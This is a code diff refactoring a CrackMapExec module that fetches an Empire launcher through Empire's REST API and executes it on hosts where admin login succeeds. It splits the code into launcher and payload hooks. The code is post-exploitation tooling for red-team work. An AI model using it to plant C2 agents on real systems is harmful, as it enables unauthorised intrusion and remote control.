@@ -16,6 +16,8 @@ class CMEModule:
 
     description = "Uses Empire's RESTful API to generate a launcher for the specified listener and executes it"
 
+    chain_support = False
+
     def options(self, context, module_options):
         '''
             LISTENER    Listener name to generate the launcher for
@@ -54,7 +56,12 @@ class CMEModule:
             context.log.error("Unable to connect to Empire's RESTful API: {}".format(e))
             sys.exit(1)
 
-    def on_admin_login(self, context, connection):
-        if self.empire_launcher:
-            connection.execute(self.empire_launcher)
-            context.log.success('Executed Empire Launcher')
+    def launcher(self, context, command):
+        return self.empire_launcher
+
+    def payload(self, context, command):
+        return
+
+    def on_admin_login(self, context, connection, launcher, payload):
+        connection.execute(launcher)
+        context.log.success('Executed Empire Launcher')
